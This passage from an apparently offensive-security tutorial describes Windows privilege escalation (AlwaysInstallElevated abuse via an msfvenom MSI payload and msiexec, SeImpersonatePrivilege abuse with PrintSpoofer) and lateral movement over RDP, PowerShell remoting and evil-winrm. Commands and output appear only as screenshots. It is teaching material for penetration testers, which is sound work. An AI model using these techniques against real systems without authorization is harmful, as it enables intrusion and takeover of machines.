![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FZcZpIBJSYbhzJR8unWG8%2Fimage.png?alt=media&token=2aede663-bacb-40d9-8e8c-607a4a167731)

We can copy and paste this base64 blob and run it correctly

Demo:

 

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FBDEABJt4u0fSqO5Kj0kr%2FBase64Obfuscate.gif?alt=media&token=9797afaf-0e03-48ba-8ead-cf9ca555938f)

# privilege-escalation

In this section, I will demonstrate some tools and techniques that can be used for elevating your privileges on a workstation some are very well known and these make it simple and automated to find these misconfigurations in an environment that can allow us as operators to elevate our context to a higher one such as an Administrator

## powerup

PowerUp has been out for a while a great PowerShell script that looks for your typical out of place configurations that can allow a regular user access to resources that they shouldn't this tool has not been updated in a while, especially the PowerShell script version one but we can utilize the C# one which Is actively maintained

Running is straightforward in its help menu we want to use all checks available and get the results from that the audit parameter is the one we use; we wait for it to finish, and we can see it has found a vulnerable configuration

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FQYxumCXT9F864Mvgjltl%2Fimage.png?alt=media&token=cb7f154d-4212-4401-90f9-5ec115259c64)

To take advantage of this method we see that 2 registry keys are enabled that allow us to install MSI packages with elevated permissions, we are mostly interested in the User Key since we should be in this context.

We can create a simple payload utilizing msfvenom to create an MSI package or a visual studio to create our custom one.

To take advantage of this method we drop our MSI payload to the workstation utilize msiexec LOLBAS and gain a shell with elevated permissions

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fzi1OLbdw9NnQDQvDlsyb%2Fimage.png?alt=media&token=ff3c0235-4ec1-4602-ba12-1d39b728652e)

Here is a small demo of this technique

Demo:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FyaIqkFJAlJhfGhxC5yKt%2FAlwaysInstallElevated.gif?alt=media&token=5a108dff-4ce1-4138-96e5-c1869dcea4be)

## privesccheck

PrivescCheck is an amazing PowerShell Script that looks for multiple vulnerable configurations, cleartext credentials, and missing patches for exploitation that can allow the operator to elevate privileges on the workstation, it is currently only in C#, but it is actively maintained and well worked on.

In this example, I will demonstrate the SeimpersonatePrivilege with this the user is allowed to impersonate a user or account and act on behalf of the user.

Running PrivescCheck will demonstrate this permission as True

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fv4fxeikQdGbHXoGPY9aY%2Fimage.png?alt=media&token=1cb3b9e0-8670-454d-bd2b-0f506cc26e14)

More info

​

[https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

TL;DR

The PrintSpoofer abuses the permissions to create a pipe and has the local system try and authenticate to impersonate its token.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FRTq3sciy6GIMKwNj6pPT%2Fimage.png?alt=media&token=aa1f5c31-f379-41f6-85df-cd9f18bb6ed3)

A demonstration of exploiting this permission

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FGIGdnRGlIdEzwdqoV6yy%2FSeImpersonatePrivilege.gif?alt=media&token=53f82c70-0ee2-4386-bf83-07a9e22f4944)

# lateral-movement

Lateral movement is when our Operator will try to jump from one workstation to another, in this section Situational Awareness plays a big role, if our operator cannot locate workstations or find the correct services, configurations, or applications running in the environment we won't be able to figure out the next logical or stealthier way to blend with our environment when moving from one box to another. A few techniques demonstrating this step will be demonstrated

 

## rdp

Remote Desktop Protocol is a GUI interface that Microsoft has built for users when trying to access a remote workstation usually running on Port 3389, this is great for employees working in remote locations trying to access the network environment.

Usually, to jump around workstations utilizing the RDP protocol a user must have special permissions to remote onto another box with the current user's permissions, on the other hand, Administrators of a Domain (Domain Admins) Or local Administrators of the box can RDP.

The following demonstration will show the use of RDP has Lateral Movement

Attacker Box RDPs into the user’s workstation

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FVWGaTDb0Vxku7phU2dEL%2Fimage.png?alt=media&token=22c73ec0-d44c-470d-b91d-74d038d433f1)

Our enumeration says that the HelpDesk user has permission to RDP onto the Desktop-Bravo workstation from the Desktop-Alpha workstation, we will enter the credentials from the user

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F1INVKb1BRpBuJ7wh6bBr%2Fimage.png?alt=media&token=df8b6596-e131-4689-ac01-98a84c87c246)

And we will successfully have moved from Alpha to Bravo via RDP

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FEu1PubOPODkVvR7AGF7c%2Fimage.png?alt=media&token=e98aa3d3-85d9-46d7-8487-f59a9c03ad8b)

## powershell-remoting

Using the WS-Management protocol, Windows PowerShell remoting lets you run any Windows PowerShell command on one or more remote computers. You can establish persistent connections, start interactive sessions, and run scripts on remote computers.

When having access to the internal network PowerShell has a CMDLET that allows to check for PS Remote availability on a Remote Host

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F4lJeLz8dxe6b1ExDJBoF%2Fimage.png?alt=media&token=b60cc44e-baff-492d-901f-e9b8228febda)

If outside the network the usual port for this connection would be 5985, this can be edited to avoid attackers to find common ports open

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FAzvJ3CO877eHK8gyHMSg%2Fimage.png?alt=media&token=fbf56bb3-2ccb-4906-b0bf-f11b286993a6)

Now form outside the network would be an amazing tool named evil-winrm that can allow us to take advantage of this protocol

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fqa6weakFyCzNUnC7LZjm%2Fimage.png?alt=media&token=c382985b-c821-4b1d-abe6-5d87f85f5652)

Internal access will allow us to connect to a different workstation, we can use various methods to authenticate but I used the approach of running as a different user with the runas command, and the user can simply access the PSSession of the remote workstation as seen below

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FfwTclJkpGCoxEwYn2FIH%2Fimage.png?alt=media&token=4e35b28b-40e9-40cd-ba32-0ff0d93395df)

